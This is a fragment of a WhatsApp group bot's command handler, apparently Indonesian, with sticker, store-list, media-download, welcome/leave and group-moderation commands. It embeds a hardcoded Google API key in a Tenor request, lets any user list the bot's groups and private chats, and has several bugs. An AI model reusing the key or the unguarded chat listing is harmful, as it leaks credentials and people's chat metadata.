		var anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${TextNyaStick}`)
	  	for (let res of anu.results) {
		   let encmedia = await lexxy.sendImageAsSticker(from, res.url, msg, { packname: packnamenya, author: authornya, categories: res.tags })
		await fs.unlinkSync(encmedia)
		}
	    }
	    
break
case prefix+'admin':
let button_menu = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: "owner" }, type: 1 },
{ buttonId: `${prefix}sewabot`, buttonText: { displayText: "sewa" }, type: 1 },
{ buttonId: `${prefix}rules`, buttonText: { displayText: "rules" }, type: 1 }
]
const ini_message_Menu = {
image: await reSize(setting.pathimg, 300, 200),
caption: teks_menu,
footer: setting.footer,
buttons: button_menu,
headerType: 4
}
const sendMsg = await lexxy.sendMessage(from, ini_message_Menu, { quoted: fkontak })
break
case prefix+'owner': case prefix+'dev':
sendContact(from, ownerNumber.split('@s.whatsapp.net')[0], ownerName, msg)
.then((res) => lexxy.sendMessage(from, { text: 'Itu Nomor Owner Kak.' }, {quoted: res}))
break
case prefix+'tes':
case prefix+'runtime': case prefix+'ping':{
if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
let timestamp = speed()
let latensi = speed() - timestamp
let respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n\nRuntime : ${runtime(process.uptime())}`
reply(respon)
}
break
//━━━━━━━━━━━━━━━[ STORE MENU ]━━━━━━━━━━━━━━━━━//
        case prefix+'shop': case prefix+'menu':
        
            if (!isGroup) return reply(mess.OnlyGrup)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
            var arr_rows = [];
            for (let x of db_respon_list) {
                if (x.id === from) {
                    arr_rows.push({
                        title: x.key,
                        rowId: x.key
                    })
                }
            }
            var listMsg = {
                text: `Hi @${sender.split("@")[0]}\n\Silahkan pilih menu dibawah untuk\n\melihat layanan dari kami`,
                buttonText: 'Klik Disini',
                footer: `*List Ceev ID*`,
                mentions: [sender],
                sections: [{
                    title: 'Menu', rows: arr_rows
                }]
            }
            lexxy.sendMessage(from, listMsg)
            
break
        case prefix+'addlist':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]                
            if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            if (isImage || isQuotedImage) {
                let media = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
                const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        addResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        reply(`Berhasil menambah List menu *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                addResponList(from, args1, args2, false, '-', db_respon_list)
                reply(`Berhasil menambah List menu : *${args1}*`)
            }
            

break
        case prefix+'dellist':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
            if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
            delResponList(from, q, db_respon_list)
            reply(`Sukses delete list message dengan key *${q}*`)
            

break
case prefix+'listgc': {
let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `     「 List Group Chat 」\n\nTotal List Group Bot : ${anu.length}`
for (let i of anu) {
 let metadata = await lexxy.groupMetadata(i)
 if (metadata.owner === "undefined") {
var loldd = false
 } else {
var loldd = metadata.owner
 }
 teks += `\n\nName : ${metadata.subject ? metadata.subject : "undefined"}\nOwner : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\nDibuat : ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nMember : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
}
reply(teks)
}


break
case prefix+'listpc': {
let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
let teks = `     「 List Personal Chat 」\n\nTotal Chat Pribadi : ${anu.length}`
for (let i of anu) {
 teks += `\n\nProfile : @${i.id.split('@')[0]}\nChat : ${i.unreadCount}\nLastchat : ${moment(i.conversationTimestamp * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`
}
reply(teks)
}


break
case prefix+'mediafire':
if (!q) return reply(`*FORMAT MEDIAFIRE DOWNLOAD*\nExample:\n${command} URL\n\nContoh:\n${command} https://www.mediafire.com/file/4jzmc4boquizy0n/HAPUS_CONFIG_FF_MAX.7z/file`)

var { mediafireDl } = require('./lib/mediafire')

var linknya = q
const baby1 = await mediafireDl(linknya)
var result4 = `*MEDIAFIRE DOWNLOAD*	
Judul : ${baby1[0].nama}
Type : ${baby1[0].mime}
Size : ${baby1[0].size}
Link : ${baby1[0].link}
			
_Sedang Mengirim file..._`

reply(result4)
lexxy.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : msg }) 

			break
case prefix+'ytmp4': case prefix+'mp4':
			   if (!q) return reply(`Kirim perintah ${command} https://youtube.com/watch?v=e00w_clLkS0`)
		var datah = await fetchJson(`https://hadi-api.herokuapp.com/api/yt2/video?url=${q}`)
		var data = datah.result
                var txtt = `*YOUTUBE DOWNLOADER*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.resolution}\n*≻ Size :* ${data.size}\n*≻ Type : ${data.ext}*\n*≻ Url Source :* ${args[1]}\n\n_Sedang Mengirim Media..._`
                var teks = `Done!`
                lexxy.sendMessage(from, { image: { url: data.thumb }, caption: txtt }, { quoted: msg })
                lexxy.sendMessage(from, { video: { url: data.download_video }, caption: teks }, { quoted: msg })
				
			break
case prefix+'ytmp3': case prefix+'mp3':
			   if (!q) return reply(`Kirim perintah ${command} https://youtube.com/watch?v=e00w_clLkS0`)
		var datah = await fetchJson(`https://hadi-api.herokuapp.com/api/yt2/audio?url=${q}`)
		var data = datah.result
                var txtt = `*YOUTUBE DOWNLOADER*\n\n*≻ Title :* ${data.title}\n*≻ Quality :* ${data.resolution}\n*≻ Size :* ${data.size}\n*≻ Type :* ${data.ext}\n*≻ Url Source :* ${args[1]}\n\n_Sedang Mengirim Media..._`
                var teks = `Done!`
                lexxy.sendMessage(from, { image: { url: data.thumb }, caption: txtt }, { quoted: msg })
                lexxy.sendMessage(from, { audio: { url: data.download_audio}, mimetype: 'audio/mpeg', fileName: `${data.title}.mp3` }, { quoted:msg })
				
			break
case prefix+'musik':{
if (!q) return reply(`contoh :\n${command} dj angel baby`)
reply(`Mencari Musik.. ${q}`)
var laguuu = q
var mus = await fetchJson(`https://hadi-api.herokuapp.com/api/soundcloud/play?query=${laguuu}`)
var judul = mus.result.title
var thumbMusk = await getBuffer(mus.result.thumbnail)
var linkori = mus.result.originalLink
var laguMusk = mus.result.download
let textMusk =`*PLAY MUSIK SOUNDCLOUD*
title : ${judul}
source : ${linkori}

segeralah buka link result sebelum kadaluarsa !
`
lexxy.sendMessage(from, { image: thumbMusk, caption: textMusk }, { quoted:msg })
lexxy.sendMessage(from, { audio: { url: laguMusk}, mimetype: 'audio/mpeg', fileName: `${mus.result.title}.mp3` }, { quoted:msg })
}
break
case prefix+'soundcloud':{
if (!q) return reply(`Contoh :\n${command} https://m.soundcloud.com/dhproduction-indonesia/hingga-tua-bersama`)
var url = q
reply(mess.wait)
var soundcd = await fetchJson(`https://hadi-api.herokuapp.com/api/soundcloud/download?url=${url}`)
var thumbCD = await getBuffer(soundcd.result.thumbnail)
var textCDnya = `*SOUNDCLOUD-DOWNLOAD*\njudul : ${soundcd.result.title}\nsource : ${url}`
lexxy.sendMessage(from, { image: thumbCD, caption: textCDnya}, { quoted: msg})
lexxy.sendMessage(from, { audio: { url: soundcd.result.download }, mimetype: 'audio/mpeg', fileName: `${soundcd.result.judul}`}, { quoted: msg})
}
break

case prefix+'play':
 if (!q) return reply(`contoh :\n${command} dj angel baby`)
reply(`Searching.. ${q}`)
var yts = require("yt-search")
var search = await yts(q)
var anu = search.videos[Math.floor(Math.random() * search.videos.length)]
var buf = await getBuffer(anu.thumbnail)
var wm = `® Created By Lexxy Official`

var buttonplayny = [
{buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: 'Audio'}, type: 1},
{buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: 'Video'}, type: 1}
                ]
                var buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `*PLAYING YOUTUBE*
⌕ judul : ${anu.title}
⌕ channel : ${anu.author.name}
⌕ durasi : ${anu.timestamp}
⌕ uploader ${anu.ago}
⌕ views : ${anu.views}

Source Url :
${anu.url}`,
                    footer: 'Silahkan pilih media dibawah.',
                    buttons: buttonplayny,
                    headerType: 4
                }
lexxy.sendMessage(from, buttonMessage, { quoted: msg })
break
        case prefix+'updatelist': case prefix+'update':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
            if (isImage || isQuotedImage) {
                let media = await downloadAndSaveMediaMessage('image', `./media/${sender}`)
                const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        updateResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        reply(`Berhasil update List menu : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                updateResponList(from, args1, args2, false, '-', db_respon_list)
                reply(`Berhasil update List menu : *${args1}*`)
            }
            break
        case prefix+'tambah':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one + nilai_two}`)
            

break
        case prefix+'kurang':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one - nilai_two}`)
            
break
        case prefix+'kali':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one * nilai_two}`)
            

break
        case prefix+'bagi':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command} *angka* *angka*\n\n_Contoh_\n\n${command} 1 2`)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one / nilai_two}`)
            

break
case 'p': case 'proses':
            if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
            if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
            if (!isQuotedMsg) return ('Reply Pesanannya!')
            let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${quotedMsg.chats}\n\nPesanan @${quotedMsg.sender.split("@")[0]} sedang di proses!`
            const getTextP = getTextSetProses(from, set_proses);
            if (getTextP !== undefined) {
                mentions(getTextP.replace('pesan', quotedMsg.chats).replace('nama', quotedMsg.sender.split("@")[0]).replace('jam', jam).replace('tanggal', tanggal), [quotedMsg.sender], true)
            } else {
//lexxy.sendMessage(`6285878313791@s.whatsapp.net`, {text: proses });
   mentions(proses, [quotedMsg.sender], true)
            }
            

break
        case 'd': case 'done':
            if (!isGroup) return ('Hanya Dapat Digunakan Gi Group')
            if (!isOwner && !isGroupAdmins) return ('Hanya Bisa Digunakan Oleh Admin')
            if (!isQuotedMsg) return ('Reply Pesanannya!')
           let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${tanggal}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\nTerimakasih @${quotedMsg.sender.split("@")[0]} Next Order ya🙏`
            const getTextD = getTextSetDone(from, set_done);
            if (getTextD !== undefined) {
                mentions(getTextD.replace('pesan', quotedMsg.chats).replace('nama', quotedMsg.sender.split("@")[0]).replace('jam', jam).replace('tanggal', tanggal), [quotedMsg.sender], true);
            } else {
//await lexxy.sendMessage(`${args[1]}@s.whatsapp.net`, {text: sukses });
   mentions(sukses, [quotedMsg.sender], true)
   }
            

break
// SET WELCOME
case prefix+'setwelcome':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Hallo @user\nSelamat Datang Di @group\n\n*Jangan lupa intro ya :*\nNama :\nKelas :\nUmur : \nStatus : \n\n_*Sering baca deskripsi.*_`)

if (isSetWelcome(from, set_welcome_group)) return reply(`Set Welcome already active`)
addSetWelcome(q, from, set_welcome_group)
reply(`Successfully Set text Welcome!`)


break
case prefix+'changewelcome':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Hallo @user\nSelamat Datang Di @group\n\n*Jangan lupa intro ya :*\nNama :\nKelas :\nUmur : \nStatus : \n\n_*Sering baca deskripsi.*_`)
changeSetWelcome(q, from, set_welcome_group)
reply(`Successfully Change text Welcome!`)


break
case prefix+'delwelcome':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isSetWelcome(from, set_welcome_group)) return reply(`Welcome Belum Di Setting\nSilahkan Ketik ${prefix}setwelcome`)
removeSetWelcome(from, set_welcome_group)
reply(`Successfully Delset text Welcome!`)


break
case prefix+'getwelcome':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isSetWelcome(from, set_welcome_group)) return reply(`Welcome Belum Di Setting\nSilahkan Ketik ${prefix}setwelcome`)
reply(`*TEXT WELCOME*\n${getTextSetWelcome(from, set_welcome_group)}`)


break
case prefix+'hit':{
reply(`*TOTAL HIT : ${ini_hitnya.value}*`)
}
break
case prefix+'topupml':
case prefix+'shoope':
case prefix+'dana':
case prefix+'ovo':{
reply('_(coming soon)_')
}
break
case prefix+'gopay':
reply('produk gangguan..')
break
// SET LEFT
case prefix+'setleft':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Gunakan dengan cara ${command} *teks_left*\n\n_Contoh_\n\n${command} Sayonara @user\nTelah Meninggalkan Grup @group\n`)
if (isSetLeft(from, set_left_db)) return reply(`Set Left already active`)
addSetLeft(q, from, set_left_db)
reply(`Successfully Set text Left!`)


break
case prefix+'changeleft':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return reply(`Gunakan dengan cara ${command} *teks_left*\n\n_Contoh_\n\n${command} Sayonara @user\nTelah Meninggalkan Grup @group\n`)
changeSetLeft(q, from, set_left_db)
reply(`Successfully Change text Self!`)


break
case prefix+'delleft':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isSetLeft(from, set_left_db)) return reply(`Welcome Belum Di Setting\nSilahkan Ketik ${prefix}setwelcome`)
removeSetLeft(from, set_left_db)
reply(`Successfully Delset text Left!`)


break
case prefix+'getleft':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isSetLeft(from, set_left_db)) return reply(`Welcome Belum Di Setting\nSilahkan Ketik ${prefix}setwelcome`)
reply(`*TEXT LEFT*\n${getTextSetLeft(from, set_left_db)}`)


break
        case prefix+'setproses': case prefix+'setp':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_p*\n\n_Contoh_\n\n${command} pesanan @pesan, tag orang @nama`)
            if (isSetProses(from, set_proses)) return reply(`Set proses already active`)
            addSetProses(q, from, set_proses)
            reply(`Successfully set proses!`)
            

break
        case prefix+'changeproses': case prefix+'changep':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_p*\n\n_Contoh_\n\n${command} pesanan @pesan, tag orang @nama`)
            if (isSetProses(from, set_proses)) {
                changeSetProses(q, from, set_proses)
                reply(`Sukses change set proses teks!`)
            } else {
                addSetProses(q, from, set_proses)
                reply(`Sukses change set proses teks!`)
            }
            

break
        case prefix+'delsetproses': case prefix+'delsetp':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isSetProses(from, set_proses)) return reply(`Belum ada set proses di sini..`)
            removeSetProses(from, set_proses)
            reply(`Sukses delete set proses`)
            

break
        case prefix+'setdone': case prefix+'setd':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_done*\n\n_Contoh_\n\n${command} pesanan @pesan, tag orang @nama\n\nList Opts : tanggal/jam`)
            if (isSetDone(from, set_done)) return reply(`Set done already active`)
            addSetDone(q, from, set_done)
            reply(`Successfully set done!`)
            

break
        case prefix+'changedone': case prefix+'changed':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!q) return reply(`Gunakan dengan cara ${command} *teks_done*\n\n_Contoh_\n\n${command} pesanan @pesan, tag orang @nama\n\nList Opts : tanggal/jam`)
            if (isSetDone(from, set_done)) {
                changeSetDone(q, from, set_done)
                reply(`Sukses change set done teks!`)
            } else {
                addSetDone(q, from, set_done)
                reply(`Sukses change set done teks!`)
            }
            

break
        case prefix+'delsetdone': case prefix+'delsetd':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isSetDone(from, set_done)) return reply(`Belum ada set done di sini..`)
            removeSetDone(from, set_done)
            reply(`Sukses delete set done`)
            

break

//━━━━━━━━━━━━━━━[ GROUP MENU ]━━━━━━━━━━━━━━━━━//
        case prefix+'linkgrup': case prefix+'link': case prefix+'linkgc':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            var url = await lexxy.groupInviteCode(from).catch(() => reply(mess.error.api))
            url = 'https://chat.whatsapp.com/'+url
            reply(url)
            

break

        case prefix+'setppgrup': case prefix+'setppgc':
            if (!isGroup) return reply(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (isImage || isQuotedImage) {
            var media = await downloadAndSaveMediaMessage('image', `ppgc${from}.jpeg`)
            if (args[1] == '\'panjang\'') {
            	var { img } = await generateProfilePicture(media)
            	await lexxy.query({
                    tag: 'iq',
                    attrs: {
                        to: from,
                        type:'set',
                        xmlns: 'w:profile:picture'
                    },
                    content: [
                    {
                        tag: 'picture',
                        attrs: { type: 'image' },
                        content: img
                    } 
                    ]
                })
                fs.unlinkSync(media)
            	reply(`Sukses`)
            } else {
                await lexxy.updateProfilePicture(from, { url: media })
                .then( res => {
                    reply(`Sukses`)
                    fs.unlinkSync(media)
                }).catch(() => reply(mess.error.api))
            }
            } else {
			    reply(`Kirim/balas gambar dengan caption ${command}`)
            }
            

break
        case prefix+'setnamegrup': case prefix+'setnamegc':
            if (!isGroup) return reply(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (args.length < 2) return reply(`Gunakan dengan cara ${command} *text*\n\n_Contoh_\n\n${command} Support ${ownerName}`)
            await lexxy.groupUpdateSubject(from, q)
            .then( res => {
                reply(`Sukses`)
            }).catch(() => reply(mess.error.api))
            

break
        case prefix+'setdesc': case prefix+'setdescription':
            if (!isGroup) return reply(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (args.length < 2) return reply(`Gunakan dengan cara ${command} *text*\n\n_Contoh_\n\n${command} New Description by ${ownerName}`)
            await lexxy.groupUpdateDescription(from, q)
            .then( res => {
                reply(`Sukses`)
            }).catch(() => reply(mess.error.api))
            

break
        case prefix+'antilink':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (args.length === 1) return reply(`Pilih on atau off\n_Contoh :_\n${command} on`)
            if (args[1].toLowerCase() === 'on'){
                if (isAntiLink) return reply(`Udah aktif`)
                antilink.push(from)
                fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                reply('Successfully Activate Antilink In This Group')
            } else if (args[1].toLowerCase() === 'off'){
                if (!isAntiLink) return reply(`Udah nonaktif`)
                let anu = antilink.indexOf(from)
                antilink.splice(anu, 1)
                fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
                reply('Successfully Disabling Antilink In This Group')
            } else {
                reply(`Pilih on atau off\n_Contoh :_\n${command} on`)
            }
            

break
        case prefix+'antiwame':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (args.length === 1) return reply(`Pilih on atau off\n_Contoh :_\n${command} on`)
            if (args[1].toLowerCase() === 'on'){
                if (isAntiWame) return reply(`Udah aktif`)
                antiwame.push(from)
                fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                reply('Successfully Activate Antiwame In This Group')
            } else if (args[1].toLowerCase() === 'off'){
                if (!isAntiWame) return reply(`Udah nonaktif`)
                let anu = antiwame.indexOf(from)
                antiwame.splice(anu, 1)
                fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
                reply('Successfully Disabling Antiwame In This Group')
            } else {
                reply(`Pilih on atau off\n_Contoh :_\n${command} on`)
            }
            

break
case prefix+'welcome':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (args.length < 2) return reply(`*Example :*\n${command} on\n${command} off\n\nPilih Salah Satu Di Atas`)
if (args[1].toLowerCase() === "on") {
if (isWelcome) return reply(`Welcome sudah aktif`)
                              welcome.push(from)
                              fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses mengaktifkan welcome di grup ini`)
                            } else if (args[1].toLowerCase() === "off") {
                              if (!isWelcome) return reply(`Welcome sudah dimatikan`)
                              var posi = welcome.indexOf(from)
                              welcome.splice(posi, 1)
                              fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses menonaktifkan welcome di grup ini`)
                            } else {
                              reply(`Pilih on atau off\n_Contoh :_\n${command} on`)
                            }


break
case prefix+'left':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (args.length < 2) return reply(`*Example :*\n${command} on\n${command} off\n\nPilih Salah Satu Di Atas`)
if (args[1].toLowerCase() === "on") {
if (isLeft) return reply(`Left sudah aktif`)
                              left.push(from)
                              fs.writeFileSync('./database/left.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses mengaktifkan left di grup ini`)
                            } else if (args[1].toLowerCase() === "off") {
                              if (!isLeft) return reply(`Left sudah dimatikan`)
                              var posi = welcome.indexOf(from)
                             left.splice(posi, 1)
                              fs.writeFileSync('./database/left.json', JSON.stringify(welcome, null, 2))
                              reply(`Sukses menonaktifkan left di grup ini`)
                            } else {
                              reply(`Pilih on atau off\n_Contoh :_\n${command} on`)
                            }


break
case prefix+'open': case prefix+'buka':
            if (!isGroup) return reply(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
	if (!isBotGroupAdmins) return reply(mess.BotAdmin)
lexxy.groupSettingUpdate(from, 'not_announcement')
reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
break
        case prefix+'close': case prefix+'tutup':
            if (!isGroup) return reply(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
		if (!isBotGroupAdmins) return reply(mess.BotAdmin)
		  lexxy.groupSettingUpdate(from, 'announcement')
	
reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)

break
        case prefix+'add':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (groupMembers.length == 257) return reply(`Anda tidak dapat menambah peserta, karena Grup sudah penuh!`)
            var mems = []
            groupMembers.map( i => mems.push(i.id) )
            var number;
            if (args.length > 1) {
                number = q.replace(/[^0-9]/gi, '')+"@s.whatsapp.net"
                var cek = await lexxy.onWhatsApp(number)
                if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
                if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
                lexxy.groupParticipantsUpdate(from, [number], "add")
                .then( res => reply(jsonformat(res)))
                .catch((err) => reply(jsonformat(err)))
            } else if (isQuotedMsg) {
                number = quotedMsg.sender
                var cek = await lexxy.onWhatsApp(number)
                if (cek.length == 0) return reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
                if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
                lexxy.groupParticipantsUpdate(from, [number], "add")
                .then( res => reply(jsonformat(res)))
                .catch((err) => reply(jsonformat(err)))
            } else {
                reply(`Kirim perintah ${command} nomer atau balas pesan orang yang ingin dimasukkan`)
            }
            

break
        case prefix+'kick':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            var number;
			if (mentionUser.length !== 0) {
                number = mentionUser[0]
                lexxy.groupParticipantsUpdate(from, [number], "remove")
                .then( res => reply(jsonformat(res)))
                .catch((err) => reply(jsonformat(err)))
            } else if (isQuotedMsg) {
                number = quotedMsg.sender
                lexxy.groupParticipantsUpdate(from, [number], "remove")
                .then( res => reply(jsonformat(res)))
                .catch((err) => reply(jsonformat(err)))
            } else {
                reply(`Tag atau balas pesan orang yang ingin dikeluarkan dari grup`)
            }
            

break
        case prefix+'promote': case prefix+'pm':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (mentionUser.length !== 0) {
                lexxy.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
                .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
                .catch(() => reply(mess.error.api))
            } else if (isQuotedMsg) {
                lexxy.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
                .then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
                .catch(() => reply(mess.error.api))
            } else {
                reply(`Tag atau balas pesan member yang ingin dijadikan admin`)
            }
            

break
        case prefix+'demote':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins) return reply(mess.GrupAdmin)
            if (!isBotGroupAdmins) return reply(mess.BotAdmin)
            if (mentionUser.length !== 0) {
                lexxy.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
                .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
                .catch(() => reply(mess.error.api))
            } else if (isQuotedMsg) {
                lexxy.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
                .then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
                .catch(() => reply(mess.error.api))
            } else {
                reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
            }
            

break
